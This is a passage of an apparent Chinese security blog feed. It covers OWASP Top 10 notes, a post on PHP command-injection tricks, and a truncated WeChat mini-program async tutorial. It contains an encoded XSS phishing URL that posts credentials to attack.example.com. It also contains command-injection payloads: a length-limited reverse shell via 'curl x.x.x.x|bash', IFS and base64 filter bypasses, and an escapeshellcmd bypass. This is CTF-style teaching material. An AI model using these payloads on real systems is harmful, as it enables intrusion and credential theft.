class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;trustedSite.example.com&#x2F;welcome.php?username&#x3D;&lt;script+type&#x3D;&quot;text&#x2F;javascript&quot;&gt;document.write(&#39;\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D&#39;);&lt;&#x2F;script&gt;</code></pre><p>这两个攻击链接都将导致页面上显示伪造的登录框，并且用户更有可能忽略URL末尾的难以理解的文本。</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>CreateUser.php</p><pre class="language-php" data-language="php"><code class="language-php">$username &#x3D; mysql_real_escape_string($username);$fullName &#x3D; mysql_real_escape_string($fullName);$query &#x3D; sprintf(&#39;Insert Into users (username,password) Values (&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)&#39;, $username, crypt($password),$fullName) ;mysql_query($query);</code></pre><p>ListUsers.php</p><pre class="language-php" data-language="php"><code class="language-php">$query &#x3D; &#39;Select * From users Where loggedIn&#x3D;true&#39;;$results &#x3D; mysql_query($query);if (!$results) &#123;exit;&#125;&#x2F;&#x2F;Print list of users to pageecho &#39;&lt;div id&#x3D;&quot;userlist&quot;&gt;Currently Active Users:&#39;;while ($row &#x3D; mysql_fetch_assoc($results)) &#123;echo &#39;&lt;div class&#x3D;&quot;userNames&quot;&gt;&#39;.$row[&#39;fullname&#39;].&#39;&lt;&#x2F;div&gt;&#39;;&#125;echo &#39;&lt;&#x2F;div&gt;&#39;;</code></pre><p>以上的web应用程序由两个独立的页面组成，一个页面用于创建用户的账户，另外一个页面用于列出当前登录的活动用户</p><p>攻击者可以将其名称设置为任意HTML，然后将其显示给“活动用户”页面的所有访问者。该HTML例如可以是窃取登录消息的密码。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p><h4 id="Prevent-6"><a href="#Prevent-6" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用设计上自动转义XSS的框架，例如最新的Ruby on Rails, React JS，了解每个框架的XSS保护的局限性，并适当处理未涵盖的用例</li><li>根据HTML输出中的上下文（正文，属性，JavaScript，CSS，或URL）转义不受信任的HTTP请求数据将解决XSS漏洞</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A7:2017-Cross-Site Scripting (XSS)</a></p><h3 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h3><h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>不安全的反序列化可以导致<a href="https://baike.baidu.com/item/远程代码执行漏洞/2491231?fr=aladdin">远程代码执行</a>、<a href="https://baike.baidu.com/item/重放攻击?fromtitle=重播攻击&fromid=19455997">重放攻击</a>、注入攻击或特权升级攻击</p><h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p><ul><li><a href="https://www.extrader.top/posts/bb56c28a/">phar反序列化浅析</a></li><li><a href="https://www.extrader.top/posts/488d0f65/">python反序列化漏洞浅析</a></li><li><a href="https://www.extrader.top/posts/d3333ead/">ctf-反序列化</a></li></ul><h4 id="Prevent-7"><a href="#Prevent-7" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>在所有序列化对象上实施完整性检查，例如数字签名，以防止恶意创建对象或篡改数据。</li><li>在对象创建之前的反序列化过程中强制执行严格的类型约束，因为代码通常希望使用一组可定义的类。</li><li>隔离并运行可能在低特权环境中反序列化的代码。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">A8:2017-Insecure Deserialization</a></p><h3 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h3><h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p><a href="https://baike.baidu.com/item/组件/6902128?fr=aladdin">组件</a>(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</p><h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p><ul><li><a href="https://www.extrader.top/posts/67caa546/">CTF-CVE</a></li></ul><p>漏洞查找：</p><p><a href="https://www.cvedetails.com/version-search.php">MITER常见漏洞和披露（CVE）搜索</a></p><p><a href="https://nvd.nist.gov/">NVD漏洞数据库</a></p><h4 id="Prevent-8"><a href="#Prevent-8" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用诸如<a href="https://www.mojohaus.org/versions-maven-plugin/">version</a>，<a href="https://owasp.org/www-project-dependency-check">DependencyCheck</a>，<a href="https://github.com/retirejs/retire.js/">retire.js</a>等工具，连续清点客户端和服务器端组件（例如，框架，库）的<a href="https://www.mojohaus.org/versions-maven-plugin/">版本</a>及其依赖<a href="https://github.com/retirejs/retire.js/">项</a>。持续监视<a href="https://cve.mitre.org/">CVE</a>和<a href="https://nvd.nist.gov/">NVD</a>等来源的组件中的漏洞。使用软件组成分析工具来自动化该过程。订阅电子邮件警报以获取与您使用的组件相关的安全漏洞。</li><li>仅通过安全链接从官方来源获取组件。优先选择经过签名的软件包，以减少包含经过修改的恶意组件的机会。</li><li>监视未维护的库和组件或未为旧版本创建安全补丁的组件。如果无法修补，请考虑部署<a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">虚拟修补程序</a>以监视，检测或防止发现的问题。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017-Using Components with Known Vulnerabilities</a></p><h3 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h3><h4 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h4><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</p><h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php">function login($userName,$password)&#123;    if(authenticate($userName,$password))&#123;    return True;    &#125;else&#123;        incrementLoginAttempts($userName);        if(recentLoginAttempts($userName) &gt; 5)&#123;        writeLog(&quot;Failed login attempt by User: &quot; . $userName . &quot; at &quot; + date(&#39;r&#39;) );        &#125;    &#125;&#125;</code></pre><p>以上代码记录可疑的多次登录尝试。</p><p>此代码仅在达到特定限制时记录失败的登录尝试。如果攻击者知道此限制，则可以通过避免该限制来阻止发现攻击。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></p><h4 id="Prevent-9"><a href="#Prevent-9" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>确保可以使用足够的用户上下文记录所有登录，访问控制失败和服务器端输入验证失败的事件，以识别可疑或恶意帐户，并保留足够的时间以进行处理。</li><li>确保以一种集中式日志管理解决方案可以轻松使用的格式生成日志。</li><li>确保高价值交易具有完整性控制的审计跟踪，以防止篡改或删除，例如仅追加数据库表或类似内容。</li><li>建立有效的监视和警报，以便及时发现并应对可疑活动。</li><li>建立或采用事件响应和恢复计划，例如<a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>或更高版本。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">A10:2017-Insufficient Logging &amp; Monitoring</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://owasp.org/www-project-top-ten/2017/Top_10">OWASP Top 10 Application Security Risks - 2017</a></li><li><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 简单介绍</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://owasp.org/&quot;&gt;Owasp&lt;/a&gt; 全称 Open Web Application Security Project（开放式Web应用程序安全项目）。&lt;/p&gt;
&lt;p&gt;其中最具权威的就是其”十大安全漏洞列表”，目前正式发布的最新版本是2017年11月份发布的。&lt;/p&gt;
&lt;p&gt;以下对2017年的Top 10版本做一个归纳，例子中不全的欢迎各位大佬评论指出，后续有会添加上。&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="Owasp" scheme="https://www.extrader.top/tags/Owasp/"/>
    
  </entry>
  
  <entry>
    <title>php命令执行小技巧</title>
    <link href="https://www.extrader.top/posts/45c7e77/"/>
    <id>https://www.extrader.top/posts/45c7e77/</id>
    <published>2020-08-14T02:55:31.000Z</published>
    <updated>2020-09-06T16:08:26.802Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-MxFiyZpg" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="115162" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><a id="more"></a><h2 id="突破命令长度限制"><a href="#突破命令长度限制" class="headerlink" title="突破命令长度限制"></a><strong>突破命令长度限制</strong></h2><p>限制条件：长度<strong>&lt;=4</strong></p><p>限制代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpshow_source(__FILE__);error_reporting(0);if(strlen($_GET[1])&lt;&#x3D;4)&#123;     echo shell_exec($_GET[1]);&#125;else&#123;     echo &quot;hack!!!&quot;;&#125;?&gt;</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><p>先看效果图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814204553709.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>&gt;</code>后面跟的文件名，可以生成一个以这个字符串命名的文件</li><li><code>*</code>可以将文件名（按首字母排序）列出来当一行命令执行</li><li><code>*v</code>匹配当前目录下以<code>v</code>结尾的的文件名，<code>*v</code>=<code>rev v</code>，输出<code>v</code>文件内容里面内容的反序结果，<code>&gt;cat|*t</code>同理</li><li><code>dir a b&gt;c</code>只会将<code>a b</code>写到文件<code>c</code>中</li></ol><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h3><p>先看效果图：</p><p>获取<code>ls -th &gt;g</code>命令</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814220444746.png" alt loading="lazy"></p><p>获取<code>curl x.x.x.x|bash</code>命令</p><p><code>&gt;cu\\</code>这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入<code>\\</code>产生<code>\</code>，但是<code>php</code> 代码<code>exec</code>时，只需要输入<code>\</code>即可产生<code>\</code>，比如 <code>exec(&quot;&gt;cu\&quot;)</code>即可。所以这里实际上是不超过4个字符的，为了演示直观，在<code>shell</code>中直接执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814223956562.png" alt loading="lazy"></p><p>执行结果：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814221328388.png" alt loading="lazy"></p><p><strong>原理</strong></p><ol><li><code>ls -t</code>按时间顺序排列文件，<code>ls -th</code>不影响命令执行，为了让倒序的时候<code>ht-</code>在<code>sl</code>前面</li><li><code>\</code>  <code>linux</code>下行末加上<code>\</code>会将该行末尾与下一行行首连接起来，简单来说应该是删掉了换行符</li></ol><p>这里需要注意，文件名中不能包含<code>/</code>这个符号的，所以需要将反弹shell的服务器根目录下默认网页设置成curl下反弹shell的命令的网页</p><p>例如我ubuntu服务器的Apache默认网页设置在<code>/etc/apache2/mods-available/dir.conf</code>中，编辑如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/girls/image-20200814225408259.png" alt loading="lazy"></p><p>1.txt中为反弹shell的命令，这样即可成功执行</p><p>或者你改index.html的内容也行</p><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h2><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">$&#123;IFS&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$&#123;IFS&#125;&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$&#123;IFS&#125;$9&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat$IFS$9&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;php下可以cat%09&#x2F;flag&lt;&gt;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat&lt;&#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">拼接linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ a&#x3D;c;b&#x3D;at;c&#x3D;&#x2F;flag;$a$b $cflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;base64编码linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ &#96;echo &quot;Y2F0IC9mbGFn&quot;|base64 -d&#96;flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bashflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;单引号、双引号linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;flagflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;fl&quot;&quot;agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ c&quot;&quot;at &#x2F;fl&#39;&#39;agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;反斜线 \linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ ca\t &#x2F;fl\agflag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;flag   # 连接文件并打印到标准输出设备上flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ rev &#x2F;flag   # 将文件内容以字符为单位反序输出&#125;e32de3e34-g45t4d2-45gt532-34f32e3&#123;galflinux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ more &#x2F;flag  # 显示文件内容，每次显示一屏flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ tail &#x2F;flag  # 在屏幕上显示指定文件的末尾若干行flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ less &#x2F;flag  # 分屏上下翻页浏览文件内容flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ head &#x2F;flag  # 在屏幕上显示指定文件的开头若干行flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ tac &#x2F;flag   # 将文件以行为单位的反序输出flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ sort &#x2F;flag  # 将文件进行排序并输出flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ nl &#x2F;flag    # 在Linux系统中计算文件内容行号     1  flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ hexdump &#x2F;flag  #显示文件十六进制格式0000000 6c66 6761 337b 3265 6633 3334 322d 35330000010 6774 3435 322d 3464 3574 6734 342d 65330000020 6533 3264 6533 0a7d0000028linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;fl*flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;linux@Extrader:&#x2F;var&#x2F;www&#x2F;html$ cat &#x2F;fla?flag&#123;3e23f43-235tg54-2d4t54g-43e3ed23e&#125;</code></pre><h2 id="绕过escapeshellcmd"><a href="#绕过escapeshellcmd" class="headerlink" title="绕过escapeshellcmd"></a><strong>绕过escapeshellcmd</strong></h2><p>测试代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $command &#x3D; &#39;dir &#39;.$_POST[&#39;dir&#39;];    $escaped_command &#x3D; escapeshellcmd($command);    var_dump($escaped_command);    file_put_contents(&#39;out.bat&#39;,$escaped_command);    system(&#39;out.bat&#39;);?&gt;</code></pre><p>执行<code>.bat</code>文件的时候，利用<code>%1a</code>，可以绕过过滤执行命令。</p><p>payload</p><pre class="language-shell" data-language="shell"><code class="language-shell">dir&#x3D;. %1a whoami</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><ul><li><a href="https://www.leavesongs.com/content/files/slides/%E6%9D%A5%E8%87%AA%E5%B0%8F%E5%AF%86%E5%9C%88%E9%87%8C%E7%9A%84%E9%82%A3%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7.pdf">来自小密圈里的那些奇技淫巧</a></li><li><a href="https://www.mi1k7ea.com/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="https://www.freebuf.com/articles/web/154453.html">挖洞经验|命令注入突破长度限制</a></li><li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-MxFiyZpg&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;115162&quot; data-server=&quot;netease&quot; data-type=&quot;song&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="命令执行" scheme="https://www.extrader.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序有关异步问题的一些操作</title>
    <link href="https://www.extrader.top/posts/80b70afe/"/>
    <id>https://www.extrader.top/posts/80b70afe/</id>
    <published>2020-08-13T12:55:31.000Z</published>
    <updated>2020-08-14T08:04:36.698Z</updated>
    
    <content type="html"><![CDATA[<p>方法不唯一，后续有新方法再补上~</p><a id="more"></a><h3 id="Promise-对象"><a href="#Promise-对象" class="headerlink" title="Promise 对象"></a>Promise 对象</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token comment">/* 异步操作成功 */</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// success</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// failure</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>关于<code>promise</code>  具体可参考阮老师的<a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></p><p>或者直接</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span><span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span>  <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="同步化异步函数"><a href="#同步化异步函数" class="headerlink" title="同步化异步函数"></a>同步化异步函数</h3><p>app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//app.js</span><span class="token keyword">function</span> <span class="token function">promisify</span><span class="token punctuation">(</span><span class="token parameter">api</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token parameter">opt<span class="token punctuation">,</span> <span class="token operator">...</span>arg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">api</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> opt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> success<span class="token operator">:</span> resolve<span class="token punctuation">,</span> fail<span class="token operator">:</span> reject <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">...</span>arg<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>  getUserInfo<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>getUserInfo<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">onLaunch</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    xxx  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  globalData<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>index.js使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。</p><h3 id="wx-request请求封装"><a href="#wx-request请求封装" class="headerlink" title="wx.request请求封装"></a>wx.request请求封装</h3><h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><p><code>api/index.js</code>封装</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getdata</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  wx<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      url<span class="token operator">:</span> url<span class="token punctuation">,</span>      data<span class="token operator">:</span> data<span class="token punctuation">,</span>      method<span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>      header<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token 